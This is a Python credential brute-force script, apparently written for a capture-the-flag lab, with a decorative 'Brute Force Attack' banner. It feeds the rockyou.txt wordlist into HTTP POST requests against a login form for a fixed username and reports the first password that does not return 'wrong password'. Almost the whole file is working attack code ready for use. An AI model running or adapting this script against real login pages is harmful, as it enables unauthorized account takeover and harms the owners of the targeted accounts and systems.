
import requests
from pwn import *
from tqdm import tqdm
import sys

print("")

def Banner():

  print("""\033[1;35m

               ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    
              ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    
              ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗      ███████║   ██║      ██║   ███████║██║     █████╔╝     
              ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝      ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     
              ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    
              ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    
                                                                                                                                                                                                            ░                                                        ░                         ░                               ░░ ░         ░ ░                                                                                                            ░                                                                                                          
  """)
print("""                                      
                                                            Coder By Youssef_EL JIhad
      """)              
                                                                                                                                    
Banner()

def main():


      print()

      for v in tqdm(range(30), desc="\033[1;32mAttack Start "):
          time.sleep(0.01)

      headers = {

          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'http://10.10.236.77',
          'Connection': 'keep-alive',
          'Referer': 'http://10.10.56.215/login/',
          'Upgrade-Insecure-Requests': '1',
      }

         
      print("")
      passwords = open('/usr/share/wordlists/rockyou.txt','r')
      print('')
      p1 = log.progress("                  Brute Force ATTACK                ")
      p1.status("\033[1;36mTry Password")
      time.sleep(2)
      counter = 1

      for password in passwords:
          password = password.rstrip('\n') 
          p1.status("\033[1;37mSearch FOR Password[%d/349]: %s" % (counter,password))


          data = {
            'username': 'DesKel',
            'password': password,
            'submit': 'submit'
          }

          response = requests.post('http://10.10.56.215/login/', data=data,headers=headers)
          counter +=1

          if "wrong password" not in response.text:
              p1.success("\033[1;32m Your Password IS Found ==========> %s" % password.strip())
              break;
if __name__=='__main__':
     main()